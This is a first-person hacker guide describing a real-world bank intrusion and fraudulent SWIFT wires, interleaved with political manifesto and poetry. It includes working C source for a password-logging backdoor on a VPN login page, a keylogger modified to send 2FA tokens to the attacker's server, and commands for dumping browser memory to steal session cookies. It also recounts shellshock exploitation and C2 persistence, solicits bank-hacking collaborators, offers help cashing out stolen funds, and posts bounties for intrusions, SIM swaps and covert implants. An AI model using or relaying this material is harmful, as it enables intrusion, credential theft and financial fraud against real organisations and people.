                              Soy un niño salvaje
                           Inocente, libre, silvestre
                             Tengo todas las edades
                            Mis abuelos viven en mí

                           Soy hermano del las nubes
                              Y sólo sé compartir
                            Sé que todo es de todos
                            que todo está vivo en mí

                           Mi corazón es una estrella
                             Soy hijo de la tierra
                          Viajo a bordo de mi espíritu
                             Camino a la eternidad


This is my simple word, which seeks to touch the hearts of those who are humble
and simple, but also dignified and rebellious. This is my simple word to tell
about my hacks, and to invite others to hack with joyful rebellion. [*1]

I hacked a bank. I did it to give an injection of liquidity, but this time from
below [*2], for the simple and humble people that resist and rebel against
injustice all over the world [*1]. In other words, I robbed a bank and gave away
the money. But I didn't do it myself. The free software movement, the offensive
powershell community, the metasploit project, and the general hacker community
made the hack possible. The community at exploit.in made it possible to turn the
compromise of a bank's computers into cash and bitcoin. And the Tor, Qubes, and
Whonix projects, along with cryptographers, and anonymity and privacy activists,
are my nahuales (protectors) [1]. They accompany me every night and make it
possible for me to remain free. 

I didn't do anything complicated. I just saw the injustice in this world, felt
love for everyone, and expressed that love the best way I knew how, through the
tools I knew how to use. I'm not motivated by hate for banks or the rich, but by
a love for life, and a desire for a world where everyone can realise their
potential and live fully. I hope to explain a little how I see the world, so you
can understand how I came to feel and act this way. And I hope this guide is a
recipe you can follow, to combine the same ingredients and bake the same cake.
Who knows, maybe these same powerful tools can help you to express your love.

                           Todos somos niños salvajes
                         inocentes, libres, silvestres

                      Todos somos hermanos de los arboles
                               hijos de la tierra

                   Solo tenemos que poner en nuestro corazón
                             una estrella encendida

                     (song by Alberto Kuselman and Chamalú)

The police will spend endless resources investigating me. They think the system
works, or at least it will once they arrest all the "bad guys". I'm just the
product of a broken system. As long as there's injustice, exploitation,
alienation, violence, and ecological destruction, there'll be an endless series
of people like me, who reject as illegitimate the system responsible for such
suffering. Arresting me won't fix their broken system. I'm just one of millions
of seeds of rebellion planted by Tupac 238 years ago in La Paz [2], and I hope
that my actions and writings water the seed of rebellion in your hearts.

[*] famous quote by Marcos

To make ourselves heard [*1], hackers sometimes have to adopt a mask, as we're
not interested in our identity being known, but in our word being understood.
The mask can be from Guy Fawkes, Salvador Dalí, Fsociety, or even a puppet of a
frog [*2]. I felt most affinity for Marcos, so I dug up his grave [*3] to use
his balaclava. I should make clear that Marcos is entirely innocent of
everything I say here due to the simple fact that, in addition to being dead,
I've never spoken to him. I hope that his ghost, if he finds out about this from
his hammock in Chiapas, will have the generosity to simply, as they say over
there, "look past me", with the same face that one would look at the passing of
an untimely insect-an insect that might very well be a beetle. [*4]

[*1] referencing another famous quote by Marcos,
        "Our fight has been to make ourselves heard"
[*2] referring to the masks adopted by Anonymous, La casa de papel, Mr. Robot,
     and https://www.youtube.com/watch?v=BpyCl1Qm6Xs
[*3] Marcos symbolically died:
     http://enlacezapatista.ezln.org.mx/2014/05/27/between-light-and-shadow/
[*4] This explanation on using Marcos' words is from Marcos/Galeano's
     explanation of using the words of Javier Marías in:
     http://enlacezapatista.ezln.org.mx/2019/08/14/the-overture-reality-as-enemy
     which in turn references Durito, a beetle who makes frequent appearances in
     Marcos' writing.

Even with the mask and change of name, many who support my actions will put too
much attention on me. With their individual agency broken by a lifetime of
domination, they look for a leader to follow or a hero to save them. But behind
the mask, I'm just a child. Todos somos niños salvajes. Nós só temos que colocar
uma estrela em chamas em nossos corações.



--[ 1 - Why Expropriate ]-------------------------------------------------------

Capitalism is a system where a minority, through war, theft and exploitation,
have laid claim to the vast majority of the world's resources. By taking away
the commons [1], they forced the majority under the control of the minority that
own everything. It's a system that's fundamentally incompatible with freedom,
equality, democracy, and Buen Vivir. That might sound ridiculous to those of us
who grew up with a propaganda machine teaching us that capitalism is freedom,
but it's not a new or controversial idea [2]. The founders of the US knew they
had to choose between creating a capitalist society, or a free and democratic
one. Madison recognized that "the man who is possessed of wealth, who lolls on
his sofa or rolls in his carriage, cannot judge of the wants or feelings of the
day laborer." But to protect against "a leveling spirit" from the landless
labourers, he felt that only landowners should vote, and the government should
be designed "to protect the minority of the opulent against the majority". John
Jay was more to the point, saying: "the people who own the country ought to
govern it".

        | |   | | 
        |m|   |m|  


In the same way that bell hooks [3] argues that it's in men's self-interest to
reject the dominator culture of patriarchy, as it emotionally cripples them and
prevents them from fully feeling love and connection, I think the dominator
culture of capitalism has a similar effect on the rich, and that they could live
more whole and fulfilling lives by rejecting the class system they think they
benefit from. For many, class privilege just means a childhood of emotional
neglect, followed by a lifetime of superficial social interaction and
meaningless work. They may know deep down that they can only genuinely connect
with people when they work with them as equals, not when people work for them.
They may know that the most fulfilling thing they could do with their material
wealth is to share it. They may know that meaningful experiences, connections,
and relationships don't come from market interactions, but by rejecting the
logic of the market and giving without expecting anything in return. They may
know that all they need to do to break out of their prison and truly live is to
let go, lose control, and take a leap of faith. But most just aren't brave
enough.

So it would be naive to focus our efforts on trying to spark a spiritual or
moral awakening in the rich [4]. As Assata Shakur says: "Nobody in the world,
nobody in history, has ever gotten their freedom by appealing to the moral sense
of the people who were oppressing them." In reality, when the rich give away
their money, they almost always do so in a way that reinforces the system that
allowed them to amass a huge amount of illegitimate wealth in the first place
[5]. And change is unlikely to come through the political process, as Lucy
Parsons says: "We can never be deceived that the rich will allow us to vote
their wealth away". In [6], Colin Jenkins justifies expropriation:

    Make no mistake, expropriation is not theft. It is not the confiscation of
    "hard-earned" money. It is not the stealing of private property. It is,
    rather, the recuperation of massive amounts of land and wealth that have
    been built on the back of stolen natural resources, human enslavement, and
    coerced labor, and amassed over a number of centuries by a small minority.
    This wealth ...  is illegitimate, both in moral principle and in the
    exploitative mechanisms in which it has used to create itself.

He thinks the first step is, "we must free our mental bondage (believing wealth
and private property have been earned by those who monopolize it; and, thus,
should be respected, revered, and even sought after), open our minds, study and
understand history, and recognize this illegitimacy together." Some books that
helped me with that were [7][8][9][10][11].

According to Barack Obama, economic inequality is "the defining challenge of our
time". Computer hacking is a powerful tool for addressing economic inequality.
Keith Alexander, the former director of the NSA, agrees, saying hacking is
responsible for "the greatest transfer of wealth in history".

--[ 2 - Introduction ]----------------------------------------------------------

This guide explains how I hacked Cayman National Bank and Trust Company (Isle
of Man). Why am I publishing this almost four years later?

1) To show what is possible

Hackers working for social change have limited themselves to the development of
privacy and security tools, DDoS, defacements, and leaks. Around the world,
projects for radical social change exist in a state of complete precarity, and
could do a lot with a little expropriated money. At least among the working
class, bank robbing is socially accepted, and the robbers often seen as folk
heroes. In the digital age, bank robbing is nonviolent, less risky, and has a
higher payoff than ever. So why is it only being done by blackhats for personal
profit, and not by hacktivists to fund radical projects? Maybe they don't
imagine themselves as capable of it. Major bank hacks have occasionally been in
the news, such as the Bangladesh Bank hack [1] attributed to North Korea, and
bank hacks attributed to the Carbanak [2] group, described as being a very
organised and large group of russian hackers with different members specialising
in different jobs. It's not that complicated.

Through our collective belief that the financial system is unchallengeable, we
control ourselves, and maintain the class system without those at the top really
needing to do anything [3]. Seeing how vulnerable and fragile the financial
system really is helps to break that collective delusion.  So banks have a
strong incentive to not report hacks, and to overstate the sophistication of the
attackers. Every financial hack that I've done or known of has not been made
public. This will be the first, and only because I decided to publish, not the
bank.

As you'll learn in this DIY guide, hacking a bank and wiring out money through
the SWIFT network does not require the backing of a government, or a large,
professional and specialised group. It is entirely possible as an amateur,
unsophisticated hacker, with public tools and basic scripting knowledge.

[1] https://en.wikipedia.org/wiki/Bangladesh_Bank_robbery
[2] https://en.wikipedia.org/wiki/Carbanak
[3] https://en.wikipedia.org/wiki/Cultural_hegemony

2) Helping others cash out

Many people reading this will already have, or with some dedicated study, will
be able to learn the technical skills needed to do a similar hack. However, many
will not have the criminal connections necessary to cash out properly.  This was
the first bank I hacked, and at the time I only had mediocre bank drops
(accounts for safely receiving and cashing out illegal transfers), so I was only
able to wire out a couple hundred thousand in total when it's normal to make
millions. I do now have the knowledge and connections to properly cash out, so
if you hack a bank but need help turning that access into actual money, and want
to use that money to fund radical social projects, contact me.

3) Collaboration

It is possible to hack banks as an amateur hacker working alone, but it's not
usually quite as easy as I make it look here. I got lucky with this bank for
several reasons:

1) It was a small bank, which meant it took a lot less time to understand how
   everything worked.

2) They had no process to review sent swift messages. Many banks do, and you
   need to write code to hide your wires from their monitoring.

3) They just used password authentication to access their application for
   connecting to the SWIFT network. Most banks are now using RSA SecurID or some
   form of 2FA. This can be bypassed by writing code to alert you when they
   enter their token so you can use it before it expires. This is simpler than
   it sounds. I've used Get-Keystrokes [1] modified not to store keylogs but
   just to, when it detects their username has been typed, make a GET request to
   my server with their username appended to the url, and then as they type the
   token, make GET requests with the digits of the token appended to the url.
   Meanwhile on my computer I have running:

   ssh me@secret_server 'tail -f /var/log/apache2/access_log'
    | while read i; do echo $i; aplay alert.wav &> /dev/null; done

   If it's a web application, you can bypass 2FA by stealing their cookie after
   they've authenticated. I'm not an APT with a team of programmers to write
   custom tools. I'm just a simple person living off the land [2], so I've used:

   procdump64 /accepteula -r -ma PID_of_Browser
   strings64 /accepteula *.dmp | findstr PHPSESSID 2> nul

   or running through findstr before strings makes it a lot faster:
   
   findstr PHPSESSID *.dmp > tmp
   strings64 /accepteula tmp | findstr PHPSESSID 2> nul

   You can also bypass it by accessing their session with hidden VNC after
   they've authenticated, or by being a little creative and targeting another
   part of their process rather than just sending SWIFT messages directly.

I feel like by collaborating with other experienced bank hackers, we could be
doing 100s of banks like Carbanak, rather than doing one every now and then by
myself. So if you have experience doing similar hacks and would like to
collaborate, contact me. My PGP key and email is at the end of [3].

--[ 3 - Stay safe out there ]---------------------------------------------------

It's important to take some simple precautions. I'll reference this section from
my last guide [1], since it apparently works well enough [2]. All I'll add is
that, as Trump has said, "Unless you catch hackers in the act, it is very hard
to determine who was doing the hacking.", so police are getting increasingly
creative [3][4] in their attempts to catch criminals in the act (and with their
encrypted disks unlocked). It'd be good to have your computer automatically
shutdown when a bluetooth device on your person moves out of range, or an
accelerometer detects movement or something.

It's probably not safe to write long papers detailing your ideology and actions
(oops!), but sometimes I feel I should.

                        Si no creyera en quien me escucha
                        Si no creyera en lo que duele
                        Si no creyera en lo que quede

--[ 4 - Getting In ]------------------------------------------------------------

In [1] I talk about the main ways to get initial access in a company's network
during a targeted attack. However, this was not a targeted attack. I didn't set
out to hack a specific bank, I just wanted to hack any bank, which is a much
easier task. This sort of untargeted approach was popularised by Lulzsec and
Anonymous [2]. For [1], I'd prepared an exploit and post-exploitation tools for
a popular VPN device. Afterwards, I scanned the internet with zmap [3] and zgrab
to identify other vulnerable devices. I had the scanner record vulnerable IPs,
along with the common name and alternative names from the device's SSL
certificate, windows domain names from the device, and the IP's reverse DNS
lookup. I grep'd the output for "bank", and had plenty to choose from, but the
word "Cayman" really caught my eye, so that's how I picked this one.

When I published my last DIY guide [1], I didn't reveal details of the sonicwall
exploit I used to hack Hacking Team, as it was quite useful for other hacks such
as this one, and I wasn't done having fun with it yet. Determined to hack
Hacking Team, I'd spent weeks reverse engineering their model of sonicwall
ssl-vpn, and even managed to find several somewhat difficult to exploit memory
corruption vulns, before I realised it was easily exploitable with shellshock
[2]. When shellshock came out, many sonicwall devices were vulnerable, just with
a request to cgi-bin/welcome, and a payload in the user-agent. Dell released a
security update and advisory for those versions. The version used by Hacking
Team and this bank had the vulnerable version of bash, but cgi requests wouldn't
trigger shellshock except for requests to a shell script, and there was one
accessible: cgi-bin/jarrewrite.sh. This apparently escaped the notice of Dell as
they never issued a security update or advisory for that version of sonicwall.
And helpfully, dell had made dos2unix setuid root, making the device easy to
root.

In my last guide, many read that I spent weeks researching a device and coming
up with an exploit, and assumed that meant I was some sort of elite hacker. The
reality, that it took me two weeks to realise that it was trivially exploitable
with shellshock, is perhaps less flattering for me, but I think is more
inspiring. It shows you really can do this yourself. You don't need to be a
genius, I'm certainly not. In reality my work against Hacking Team began a year
earlier. When I learned about Hacking Team and Gamma Group from Citizen Lab's
research [3][4], I decided to poke around and see if I could find anything. I
didn't get anywhere with Hacking Team, but with Gamma Group I got lucky and was
able to hack their customer support portal with basic sql injection and file
upload vulns [5][6]. However, despite the support server giving me a pivot into
Gamma Group's internal network, I was unable to further compromise the company.
From my experience with Gamma Group and other hacks, I realised I was really
limited by my lack of knowledge of privilege escalation and lateral movement in
windows domains, and lack of knowledge of active directory and windows in
general. So I studied and practiced (see section 11), until I felt ready to
revisit Hacking Team almost a year later. The practice paid off, and that time I
was able to fully compromise the company [7]. Before I realised that I could get
in with shellshock, I was prepared to happily spend months studying exploit
development and writing a reliable exploit for one of the memory corruption
vulns I'd found. I just knew that Hacking Team needed to be exposed, and that
I'd take as long as I needed and learn whatever I needed to make that happen. To
do these hacks you don't need to be brilliant. You don't even need great
technical knowledge. You just need to be dedicated and to believe in yourself.

----[ 4.2 - The Backdoor ]------------------------------------------------------

Part of the backdoor that I'd prepared for Hacking Team (see [1] section 6) was
a simple wrapper around the login page to record passwords:

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>

int main()
{
        char buf[2048];
        int nread, pfile;

        /* read the log if special cookie is set  */
        char *cookies = getenv("HTTP_COOKIE");
        if (cookies && strstr(cookies, "secret password")) {
                write(1, "Content-type: text/plain\n\n", 26);
                pfile = open("/tmp/.pfile", O_RDONLY);
                while ((nread = read(pfile, buf, sizeof(buf))) > 0)
                        write(1, buf, nread);
                exit(0);
        }

        /* parent stores POST data and sends to
           child which is real login program */
        int fd[2];
        pipe(fd);
        pfile = open("/tmp/.pfile", O_APPEND | O_CREAT | O_WRONLY, 0600);
        if (fork()) {
                close(fd[0]);

                while ((nread = read(0, buf, sizeof(buf))) > 0) {
                        write(fd[1], buf, nread);
                        write(pfile, buf, nread);
                }

                write(pfile, "\n", 1);
                close(fd[1]);
                close(pfile);
                wait(NULL);
        } else {
                close(fd[1]);
                dup2(fd[0],0);
                close(fd[0]);
                execl("/usr/src/EasyAccess/www/cgi-bin/.userLogin",
                      "userLogin", NULL);
        }
}


In the case of Hacking Team, they logged into the VPN with one-time passwords,
so the VPN just got me network access and I still needed to do some work to get
domain admin in their network. I wrote about lateral movement and privilege
escalation in windows domains in that guide [1]. In this case, their windows
domain passwords were used for authentication with the VPN, so I got a bunch of
windows passwords, including a domain admin. I now had full access in their
network, but that's normally the easy part. The harder part is understanding how
they operate and how to get money out.

----[ 4.3 - Fun Facts ]---------------------------------------------------------

Interestingly, from following their investigation of the hack, it seems someone
else may have independently compromised the bank around the same time I did,
with a targeted phishing email [1]. As the old saying goes, "give someone an
exploit and they'll have access for a day, teach them to phish and they'll have
access for life" [2]. Also, that someone else randomly targeted the same small
bank at the same time I did (they'd registered a domain similar to the bank's
real one to send the phish from), suggests that bank hacks are happening way
more often than is being reported.

A fun tip so that you can follow investigations of your hacks, is to have backup
access that you don't touch unless you lose your normal access. I have one
simple script that just asks for commands once a day or less, and is just for
maintaining long term access in the event my normal access is blocked. Then I
had powershell empire [3] connecting back more frequently to a different IP, and
had empire spawn meterpreter [4] to a third IP, which I used for most of my
work. When PWC came to investigate the hack, they found the empire and
meterpreter usage and cleaned those computers and blocked those IPs, but didn't
detect my backup access. PWC had added network monitoring devices so they could
analyze traffic and find if computers were still infected, so I didn't want to
connect to their network much. I just ran mimikatz once to get their new
passwords, and then followed along with their investigation by reading their
emails in outlook web access.

--[ 5 - Understanding a Bank's Operations ]-------------------------------------

In order to understand how the bank operated and how I could get money out, I
followed the techniques I outlined in [1] in section "13.3 - Internal
reconnaissance". I downloaded a list of all filenames, grep'd it for words like
"SWIFT" and "wire", and downloaded and viewed any files with interesting names.
I also searched employee emails, but by far the most useful technique was
watching how bank employees work with keylogging and screenshots. I didn't know
about it at the time, but windows comes with a great built in monitoring tool
for this [2]. As described in [1] in 13.3 technique #5, I keylogged the whole
domain (recording window titles along with keystrokes), grep'd for SWIFT,
and found some employees opening 'SWIFT Access Service Bureau - Logon'. For
those employees, I executed meterpreter as in [3], and used the
post/windows/gather/screen_spy module to take screenshots every 5 seconds, to
watch how they work. They were using a remote citrix app from bottomline [4] to
access the SWIFT network, where each SWIFT MT103 payment message had to pass
through three employees, one to "create" the message, one to "verify" it, and
one to "authorise" it. Since I had all their credentials thanks to the
keylogger, I could easily do those three steps myself.  And as far as I could
tell from watching them work, they did not review sent SWIFT messages, so I
should have enough time to get money out of my bank drops before the bank
notices and tries to reverse the wires.

--[ 6 - Sending the money ]-----------------------------------------------------

I had no clue what I was doing and was just figuring it out as I went along.
Somehow the first wires I sent out went fine. The next day, I messed up sending
a wire to mexico which put an end to my fun. This bank was sending their
international wires thanks to their correspondent account at Natwest. I'd seen
that wires in GBP had their correspondent listed as NWBKGB2LGPL, while all
others were NWBKGB2LXXX. The mexican wire was in GBP so I assumed I should put
NWBKGB2LGPL as the correspondent. However, if I'd done more preparation I'd have
known that the GPL instead of XXX meant to send the payment via the UK-only
Faster Payments Service, rather than as an international wire, which obviously
isn't going to work when trying to send money to mexico. So the bank got an
error message back. The same day, I also tried to send a £200k payment to the UK
using NWBKGB2LGPL, which failed because 200k was over their limit for sending
via faster payments so I needed to use NWBKGB2LXXX. They got an error message
for that too. They read the messages, investigated, and saw the rest of my
wires.


--[ 7 - The loot ]--------------------------------------------------------------

From my writing, you probably have a good sense of what my ideas are and what I
support. However, I don't want anyone to have legal problems over receiving
expropriated funds, so I won't say anything more about where the money went.
Journalists will also probably want to put a dollar figure on how much I
redistributed through this and similar hacks, but I'd rather not encourage our
perverse habit of measuring actions by their economic value. Any action, done
from a place of love rather than ego, is admirable. Unfortunately, those our
society most respects and values: public figures, businessmen, people in
"important" positions, and the rich and powerful, generally got where they are
by acting more out of ego that out of love. It's the simple, humble, and
"invisible" people that we should look for and admire.


--[ 8 - Cryptocurrency ]--------------------------------------------------------

Redistributing expropriated money to awesome projects making positive social
change would be easier and safer if those projects accepted anonymous donations
via cryptocurrency like monero, zcash, or at least bitcoin. Understandably, a
lot of those projects have an aversion to cryptocurrency, as it looks more like
some weird hypercapitalist dystopia than the social economy we envision. I share
their skepticism, but think that it is useful for enabling anonymous donations
and transactions, and limiting government surveillance and control. Much like
cash, which for the same reasons many countries are trying to limit the use of.


--[ 9 - Powershell ]------------------------------------------------------------

In this, and in [1], I made heavy use of powershell. At the time, powershell was
great, you could do pretty much anything you wanted, with no AV detection and
little forensic footprint. However with the introduction of AMSI [2], offensive
powershell is on the way out. Nowadays offensive C# is in, with tools like
[3][4][5][6]. AMSI is coming to .NET in 4.8 so C# tools will probably have a
nice couple years before they also go out of style. Then we'll go back to using
C or C++, or maybe Delphi will come back in style. Specific tools and techniques
change every couple of years but there's really not that much change. Hacking
today is fundamentally the same as it was in the 90s. Even all the powershell
scripts used here and in [1] are still perfectly usable today, after a little
custom obfuscation.

              Privacy for the weak, transparency for the powerful.

Offshore banking provides businessmen, politicians, and the rich with privacy
from their own government. It might seem hypocritical for me to expose them,
seeing as I'm generally in favor of privacy and against government surveillance.
However, the law was already written by and for the rich to protect their system
of exploitation, with some limits (ie taxation), so that society can function
and their system doesn't collapse under their own greed. So privacy for the
powerful, allowing them to evade the limits of a system already designed to
privilege them, is not the same thing as privacy for the weak, which protects
them from a system designed to exploit them.

Even journalists with the best intentions can't possibly look through such a
massive amount of material and know what is relevant to different people around
the world. When I leaked Hacking Team's files, I'd given the Intercept
everything but the RCS source code a month ahead of time. They found a couple of
the 0days Hacking Team was using and reported them to MS and Adobe ahead of
time, and published a few stories after the leak was public. Compare that with
the massive amount of stories and research that came out of the full public
leak. Looking at that, and the managed (non)release [1] of the panama papers, I
think fully and publicly leaking the material is the correct choice.

Psychologists have found that those at the bottom of hierarchies tend to
empathise with and understand those at the top, but that the reverse is less
common. This explains why in this sexist world, many men joke about how they
can't understand women, as if they're an inexplicable mystery. It explains why
the rich, if they stop and think about those in poverty at all, give advice and
"solutions" so out of touch with reality that it's laughable. It explains why we
hail businessmen as brave risk takers. What are they risking, besides their
privilege? If all their ventures fail, they'll just have to live and work like
the rest of us. It also explains why many will call this unredacted leak
irresponsible and dangerous. They feel more strongly the "danger" to an offshore
bank and it's clients, than they feel the misery of those dispossessed by this
unequal and unjust system. Is leaking their finances truly even a danger to
them, or just to their position at the top of a hierarchy that shouldn't exist?

--[ 11 - Learn to hack ]--------------------------------------------------------

    You don't start out hacking good stuff. You start out hacking crap and
    thinking it's good stuff, and then gradually you get better at it.
    That's why I say one of the most valuable traits is persistence.

    - Octavia Butler's advice for the aspiring APT

The best way to learn hacking is through practice. Set up a lab environment with
virtual machines and start trying things out, taking breaks to research anything
you don't understand. At a minimum you'll want a windows server as a domain
controller, another normal domain joined windows vm, and a dev machine with
visual studio for compiling and modifying tools. Try out meterpreter, mimikatz,
bloodhound, kerberoasting, smb relaying, making an office document with macros
that spawn meterpreter or another RAT, psexec and other lateral movement
techniques [1], and the other scripts, tools and techniques mentioned in this
guide and in [2]. At first you can disable windows defender, but then try
everything with it enabled [3][4] (but with automatic sample submission off).
Once you're comfortable with all that, you're ready to hack 99% of companies.
Some things that will help you a lot to learn at some point are being
comfortable with bash and cmd.exe, basic proficiency in powershell, python, and
javascript, knowledge of kerberos [5][6] and active directory [7][8][9][10], and
fluency in english. A good introductory book is The Hacker Playbook.

I'll also write a little about what not to focus on so you don't get sidetracked
because someone told you you're not a "real" hacker if you don't know assembly
language.  Obviously, learn about whatever interests you, but I'm writing this
from the perspective of what to focus on that'll give you the most practical
results when hacking companies to leak and expropriate. Basic knowledge of web
application security [11] is useful, but specialising more in web security is
not really the best use of time unless you want to make a career in pentesting
or bug bounty hunting. CTFs, and most of the resources you'll find when
searching for information about hacking, generally focus on skills like web
security, reverse engineering, exploit development etc. This makes sense if it's
understood as a way to prepare people for careers in industry, but not for our
goals. Intel agencies can afford to have a team dedicated to state of the art
fuzzing, a team working on exploit development with one guy just researching new
heap manipulation techniques, etc. We don't have the time or resources for that.
The two most important skills by far for practical hacking, are phishing [12]
and social engineering for initial access, and then being able to escalate and
move around in windows domains.

Today hacking is done almost entirely by blackhats for personal profit,
whitehats for shareholder profit (and in defense of the banks, companies, and
states that are destroying us and our planet), and by militaries and
intelligence agencies as part of war and conflict. Seeing as our world is
already on the brink, I thought that in addition to technical advice on learning
to hack, I should include some resources that helped my development and have
guided how I use my hacking knowledge.

--[ 13 - Healing ]--------------------------------------------------------------

Hackers have high rates of depression, suicide, and mental health struggles. I
don't think that this is caused by hacking, but by the kind of environment many
hackers come from. Like many hackers, I grew up with little human contact, a kid
raised by the internet. I struggle with depression and emotional numbness.
Willie Sutton is often quoted as saying he robbed banks because "that's where
the money is", but that's incorrect. What he actually said was:

    Why did I rob banks? Because I enjoyed it. I loved it. I was more
    alive when I was inside a bank, robbing it, than at any other time in
    my life. I enjoyed everything about it so much that one or two weeks
    later I'd be out looking for the next job. But to me the money was the
    chips, that's all.

Hacking made me feel alive - it started as a way to self-medicate depression.
Later I realized I could actually do something positive with it. I don't at all
regret how I grew up, it's led to many beautiful experiences in my life. But I
knew I couldn't continue living that way. So I started spending more time off my
computer, with others, learning to open myself up, to feel my emotions, to
connect with others, to take risks and to be vulnerable. It's far harder than
hacking, but in the end it's more rewarding. It's still a struggle, but even if
I'm slow and stumbling, I feel like I'm on a good path.

Hacking, done conscientiously, can also be what heals us. According to Mayan
teachings, we have a gift given to us by nature, that we need to understand so
that we can use it to serve our community. In [1], it explains:

    When a person doesn't accept their job or mission, they begin to suffer
    illnesses, apparently incurable; although in the short-term it doesn't
    cause death, just suffering, with the objective of waking or becoming
    aware. That's why it's indispensable that a person who has acquired
    knowledge and does their work in the communities pay their Toj and maintains
    constant communication with the Creator and their ruwäch q’ij, as they
    constantly need the force and energy of them. If not, the illnesses that
    caused them to take on their work can return to cause damage.

If you feel that hacking is increasing your isolation, depression, or other
suffering, take a break. Give yourself time to know yourself and become
aware. You deserve to live happy, healthy, and fully.

--[ 14 - Hacktivist Bug Bounty Program ]----------------------------------------

I think that hacking to acquire and leak documents in the public interest is one
of the most socially beneficial ways that hackers can use their skills.
Unfortunately for hackers, as for most fields, the perverse incentives of our
economic system don't align with what benefits society. So this program is my
attempt to make it possible for good hackers to earn an honest living uncovering
material in the public interest, rather than having to sell their labour to the
cybersecurity, cybercrime, or cyberwar industries. Examples of companies I'd
love to pay for leaks from include the mining, lumber, and cattle companies
ravaging our beautiful latin america (and assassinating the environmentalists
trying to stop them), companies involved in attacking Rojava such as Havelsan,
Baykar Makina, or Aselsan, surveillance companies like NSO group, war criminals
and profiteers like Blackwater and Halliburton, private prison companies like
GeoGroup and CoreCivic/CCA, and corporate lobbyists like ALEC. Be mindful when
selecting where to investigate. For example, we all know that oil companies are
evil -- they're destroying the planet to get rich. They've known that themselves
since the 80s [1]. However, if you hack them directly, you'll have to dig
through enormous amounts of incredibly boring information about their day to day
operations. It'll probably be a lot easier to find something interesting by
targeting their lobbyists [2]. Another way to select viable targets is to read
stories by investigative journalists like [3], that are interesting but lack
hard evidence. That's what your hacking can uncover.

I'll pay up to $100K each for those sorts of leaks, depending on the public
interest and impact of the material, and the work involved in the hack.
Obviously, leaking all the documents and internal communication from some of
those businesses would have a benefit to society far exceeding 100k, but I'm not
trying to make anyone rich, I'm just trying to provide enough funding so that
hackers can earn a dignified living doing good work. Due to time constraints and
security concerns, I will not open and look through material myself. Rather,
once the material is published, I'll read what journalists write about it and
judge the public interest of the material from that. My contact information is
at the end of [4].

How you obtain the material is up to you. You can use traditional hacking
techniques outlined in this guide and in [4]. You can sim swap [5] a corrupt
politician or businessman and then download their emails and cloud backups. You
can order an IMSI catcher from alibaba and use it outside their offices. You can
go wardriving -- of the old or new kind [6]. You can be an insider who already
has access. You can go old-school low-tech like [7] and [8] and just sneak into
their offices. Whatever works for you.

----[ 14.1 - Partial payouts ]--------------------------------------------------

Are you a good maid working in an evil corp [1], and willing to slip a hardware
keylogger onto an executive's computer, swap out their charging cable for a
modified [2] one, hide a mic in a room where they discuss their evil plans, or
leave one of these [3] somewhere around the office?

[1] https://en.wikipedia.org/wiki/Evil_maid_attack
[2] http://mg.lol/blog/defcon-2019/
[3] https://shop.hak5.org/products/lan-turtle

Are you good with phishing and social engineering and got a shell on an
employee's computer, or phished their vpn credentials? But unable to get domain
admin and download the goods?

Have you been doing bug bounty programs and become an expert in web app hacking,
but don't have enough all around hacking experience to fully compromise the
company?

Do you have a knack for reverse engineering? Scan some evil corps to see what
devices they have exposed to the internet (firewall, vpn, and mail scanning
appliances will be much more useful than stuff like IP cameras), reverse
engineer it and find a remotely exploitable vulnerability.

If I'm able to work with you to compromise the company and get material in the
public interest, you'll be compensated for your work. If I don't have time to
work on it myself, I'll at least try and advise you on how to continue to
complete the hack yourself.

Right now helping those in power hack and surveil dissidents, activists, and the
general population is a multibillion dollar industry, while hacking and exposing
those in power is risky and unpaid volunteer work. Turning it into a
multimillion dollar industry won't quite fix that power imbalance and solve
society's problems. But I think it'll be fun. So I can't wait for people to
start claiming bounties!

                  Construidas por el enemigo pa encerrar ideas
                encerrando compañeros pa acallar gritos de guerra
                    es el centro de tortura y aniquilamiento
                   donde el ser humano se vuelve más violento
              es el reflejo de la sociedad, represiva y carcelaria
                   sostenida y basada en lógicas autoritarias
                       custodiadas reprimidos y vigilados
                   miles de presas y presos son exterminados
                 ante esta máquina esquizofrénica y despiadada

                  rompiendo el aislamiento y el silenciamiento
                  fuego y guerra a la carcel vamos destruyendo!

                    Rap Insurrecto - Palabras En Conflicto

It'd be typical to end a hacker zine saying free hammond, free manning, free
hamza, free those arrested in the fabricated Network case, etc. I'll take that
tradition to it's radical conclusion [1] and say abolish prisons already! Being
a criminal myself, you might feel that I'm a little biased on the issue. But
seriously, it's not even controversial, even the UN mostly agrees [2]. So free
all the migrants [3][4][5][6], often imprisoned by the same countries who
created the war, environmental, and economic destruction that they're fleeing
from. Free everyone imprisoned by the war on drug users [7]. Free everyone
imprisoned by the war on the poor [8]. Prisons are about hiding and ignoring the
evidence of social problems rather than genuinely fixing them. And until
everyone is free, fight the prison system by not ignoring and forgetting those
stuck inside. Send them love, letters, helicopters [9], pirate radio [10], and
books, and support those organizing from the inside [11][12].

--[ 16 - Conclusion ]-----------------------------------------------------------

Our world is upside down [1]. The justice system represents injustice. Law and
order is about creating an illusion of social peace to hide deep and systematic
exploitation, violence, and injustice. Follow your conscience, not the law.

[1] Upside Down: A Primer for the Looking-Glass World - Galeano

Businessmen get rich harming people and the planet, while care work is largely
unpaid. Through the assault on anything communal, we've somehow managed to build
densely populated cities full of loneliness and isolation. Our political and
economic system encourages all the worst possibilities of human nature: greed,
selfishness, ego, competition, lack of compassion, and love for authority. So
for everyone who's stayed sensitive and compassionate in a cold world, for all
the everyday heroes practicing everyday kindness, for all of you who have a
burning star in your hearts: гоpи, гоpи ясно, чтобы не погасло!
